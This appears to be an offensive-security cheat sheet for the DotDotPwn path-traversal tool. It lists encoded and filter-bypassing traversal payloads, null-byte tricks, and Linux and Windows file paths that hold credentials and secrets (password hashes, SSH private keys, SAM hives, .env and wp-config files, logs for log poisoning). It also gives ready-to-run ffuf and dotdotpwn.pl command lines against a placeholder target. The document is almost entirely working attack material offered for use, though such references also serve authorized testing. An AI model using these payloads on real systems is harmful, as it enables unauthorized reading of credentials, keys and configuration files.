# DotDotPwn — Traversal Payloads, Encoding & Integration

## Encoding Variants Cheatsheet

```
# Basic
../
../../
../../../

# URL encoded
%2e%2e%2f
%2e%2e/
..%2f

# Double URL encoded
%252e%252e%252f
%252e%252e/
..%252f

# Unicode overlong
..%c0%af          (/ as UTF-8 overlong)
..%c1%9c          (\ as UTF-8 overlong)
%c0%ae%c0%ae/    (.. as overlong)

# Null byte (bypass extension check)
../../../etc/passwd%00
../../../etc/passwd%00.php
../../../etc/passwd\0

# Double slash bypass
....//
....\/
..../
....\\

# Dot truncation (PHP < 5.3, long path)
../../../etc/passwd.................
../../../etc/passwd/./././././././

# Backslash (Windows, some mixed)
..\
..\..\
..\..\..\

# URL + backslash mix
..%5c
..%5c..%5c

# Absolute path
/etc/passwd
%2fetc%2fpasswd
/windows/win.ini
```

## Windows Target Paths

```
# System info
windows\win.ini
windows\system.ini
windows\system32\drivers\etc\hosts
windows\system32\cmd.exe
boot.ini
autoexec.bat

# Web configs
inetpub\wwwroot\web.config
inetpub\wwwroot\global.asa
windows\microsoft.net\framework\v4.0.30319\config\machine.config

# User data
users\administrator\ntuser.dat
windows\repair\sam
windows\system32\config\sam
windows\system32\config\system
```

## Linux Target Paths

```
# Authentication
/etc/passwd
/etc/shadow
/etc/group
/etc/sudoers

# Network
/etc/hosts
/etc/resolv.conf
/etc/network/interfaces
/proc/net/tcp

# SSH keys
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/USER/.ssh/id_rsa

# Web configs
/var/www/html/.htaccess
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/var/www/html/wp-config.php
/var/www/html/.env

# PHP
/etc/php.ini
/etc/php/7.4/apache2/php.ini

# Logs (for log poisoning after traversal)
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/nginx/access.log
/proc/self/environ
/proc/self/fd/2
```

## Integration with ffuf

```bash
# Generate Linux traversal wordlist
dotdotpwn.pl -m payload -d 10 -O linux | sort -u > linux_traversal.txt

# Generate Windows traversal wordlist
dotdotpwn.pl -m payload -d 8 -O windows | sort -u > windows_traversal.txt

# Use with ffuf (GET param)
ffuf -u "http://target.com/download?file=FUZZ" \
    -w linux_traversal.txt \
    -mc 200 -fs 0 -t 50

# Append /etc/passwd to every payload
sed 's|$|/etc/passwd|' linux_traversal.txt > linux_passwd.txt
ffuf -u "http://target.com/page?f=FUZZ" \
    -w linux_passwd.txt \
    -mc 200 -t 50

# SecLists LFI wordlist (often better coverage)
ffuf -u "http://target.com/page?f=FUZZ" \
    -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
    -mc 200 -t 50
```

## Common DotDotPwn Command Patterns

```bash
# Quick HTTP test - find /etc/passwd
dotdotpwn.pl -m http -h target.com -f /etc/passwd -k "root:" -d 6 -q

# HTTP-URL with traversal in param value
dotdotpwn.pl -m http-url \
    -u "http://target.com/page.php?file=TRAVERSAL/../../etc/passwd" \
    -k "root:" -d 8

# Find exact traversal depth
dotdotpwn.pl -m http-url \
    -u "http://target.com/dl?f=TRAVERSAL" \
    -f /etc/passwd -k "root:" -X

# HTTPS with SSL
dotdotpwn.pl -m http -h target.com -S -x 443 \
    -f /etc/passwd -k "root:" -d 6

# FTP traversal
dotdotpwn.pl -m ftp -h target.com -U ftpuser -P ftppass \
    -O linux -f /etc/passwd -k "root:" -s

# Multi-extension testing
dotdotpwn.pl -m http -h target.com -f /etc/passwd -e ".php" \
    -k "root:" -d 6

# Windows target
dotdotpwn.pl -m http -h target.com -O windows -d 8 \
    -f "windows\\win.ini" -k "[fonts]" -q

# Extra files (config, web.config)
dotdotpwn.pl -m http -h target.com -E -k "password" -d 6

# Full report
dotdotpwn.pl -m http -h target.com -f /etc/passwd -k "root:" \
    -r traversal_report.txt -d 8 -O linux
```

## Filter Bypass Patterns

```bash
# When ../ stripped once
....//....//etc/passwd          # becomes ../../etc/passwd after strip
....\/....\/etc/passwd

# When / blocked
..%2f..%2f..%2fetc%2fpasswd

# When . blocked
%2e%2e%2f%2e%2e%2fetc%2fpasswd

# When both . and / blocked
%252e%252e%252fetc%252fpasswd

# Null byte to bypass extension requirement
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg
../../../../etc/passwd%00.php
```
